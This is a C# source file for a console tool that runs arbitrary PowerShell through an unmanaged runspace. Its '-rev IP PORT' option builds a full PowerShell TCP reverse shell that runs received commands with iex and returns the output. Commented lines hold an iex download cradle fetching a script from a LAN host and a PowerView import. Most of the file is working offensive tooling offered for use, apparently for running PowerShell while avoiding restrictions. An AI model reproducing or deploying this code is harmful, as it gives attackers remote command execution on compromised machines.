using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Management;
using System.IO;
using System.Collections.ObjectModel;
using System.Collections.Generic;
using System.Threading;

namespace Runspaces2
{
    class Program
    {
        static void Main(string[] args)
        {

            try
            {
                int length = args.Length;


                RunspaceConfiguration rc = RunspaceConfiguration.Create();

                Runspace r = RunspaceFactory.CreateRunspace(rc);
                r.Open();
                PowerShell pshell = PowerShell.Create();
                string cmd;

                if (length == 0)
                {
                    Console.WriteLine("Help Menu");
                    Console.WriteLine("file.exe command_here");
                    Console.WriteLine("file.exe -f file.ps1");
                    Console.WriteLine("file.exe -rev IP PORT");
                    Environment.Exit(0);
                }
                if (length > 1)
                {
                    if (args[0] == "-rev")
                    {
                        //string cmd = @"iex(new-object net.webclient).downloadstring('http://192.168.0.102:8000/p.ps1')";
                        string ip = args[1];
                        string port = args[2];
                        cmd = @"$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'";
                        cmd += "," + port + @");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
                    }
                    else if (args[0] == "-f")
                    {
                        cmd = File.ReadAllText(args[1]);
                        //Console.WriteLine(cmd);
                    }
                    else
                    {
                        cmd = String.Join(" ", args);
                    }
                }
                else
                {
                    cmd = String.Join(" ", args);

                }



                //string cmd = File.ReadAllText(args[0]);
                //string cmd = @"import-module powerview.ps1;get-help > C:\Users\stargirl\Desktop\tmp1.txt";
                //string cmd = String.Join(" ", args);
                //Console.WriteLine(cmd);
                //string[] cmdlets = cmd.Split(';');
                //Console.WriteLine(cmd);
                //string cmd = "whoami";
                pshell.AddScript(cmd);
                pshell.Runspace = r;
                Collection<PSObject> po = pshell.Invoke();
                //Thread.Sleep(3000);
                //pshell.AddScript("whoami | out-file 'C:\\Users\\stargirl\\Desktop\\tmp2.txt'");
                // pshell.Invoke();
                foreach (PSObject p in po)
                {
                    Console.WriteLine(p.ToString());
                }
                Environment.Exit(0);
                // Console.WriteLine("Press any key to continue");
                // Console.ReadKey();
            }
            catch { }
        }
    }
}
